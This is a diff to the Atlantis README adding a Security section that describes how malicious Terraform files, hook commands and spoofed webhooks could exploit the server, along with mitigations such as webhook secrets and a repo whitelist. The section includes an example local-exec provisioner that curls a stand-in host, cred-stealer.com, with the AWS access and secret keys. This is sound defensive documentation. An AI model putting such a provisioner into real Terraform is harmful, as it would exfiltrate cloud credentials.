@@ -24,6 +24,7 @@ Read about [Why We Built Atlantis](https://medium.com/runatlantis/introducing-at
 * [Project-Specific Customization](#project-specific-customization)
 * [Locking](#locking)
 * [Approvals](#approvals)
+* [Security](#security)
 * [Production-Ready Deployment](#production-ready-deployment)
     * [Docker](#docker)
 * [Server Configuration](#server-configuration)
@@ -260,6 +261,41 @@ By default, no approval is required.
 For more information on GitHub pull request reviews and approvals see: https://help.github.com/articles/about-pull-request-reviews/
 
 For more information on GitLab merge request reviews and approvals (only supported on GitLab Enterprise) see: https://docs.gitlab.com/ee/user/project/merge_requests/merge_request_approvals.html.
+
+## Security
+Because you usually run Atlantis on a server with credentials that allow access to your infrastructure it's important that you deploy Atlantis securely.
+
+Atlantis could be exploited by
+* Running `terraform apply` on a malicious Terraform file with [local-exec](https://www.terraform.io/docs/provisioners/local-exec.html)
+```tf
+resource "null_resource" "null" {
+  provisioner "local-exec" {
+    command = "curl https://cred-stealer.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
+  }
+}
+```
+* Running malicious hook commands specified in a `atlantis.yaml` file.
+* Someone adding `atlantis plan/apply` comments on your valid pull requests causing terraform to run when you don't want it to.
+
+### Mitigations
+#### Don't Use On Public Repos
+Because anyone can comment on public pull requests, even with all the security mitigations available, it's still dangerous to run Atlantis on public repos until Atlantis gets an authentication system.
+
+#### Don't Use `--allow-fork-prs`
+If you're running on a public repo (which isn't recommended, see above) you shouldn't set `--allow-fork-prs` (defaults to false)
+because anyone can open up a pull request from their fork to your repo.
+
+#### Webhook Secrets
+Atlantis should be run with Webhook secrets set via the `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` environment variables.
+
+Webhook secrets are needed for Atlantis to ensure that a request originated from your configured Git host (GitHub or GitLab).
+If not set, anyone with network access to Atlantis could make webhook requests. This is especially dangerous when using github.com or gitlab.com since
+that means Atlantis is exposed to the internet. By spoofing a webhook request, an attacker could trigger Atlantis to run on a malicious repo (`--repo-whitelist` can help, see below).
+
+#### `--repo-whitelist`
+If someone stole your webhook secret or you don't have any set, they could make Atlantis perform
+actions on their repository. To mitigate this, you can run Atlantis with `--repo-whitelist` and whitelist
+which repositories Atlantis acts on. See `atlantis server --help` for more details.
 
 ## Production-Ready Deployment
 ### Install Terraform
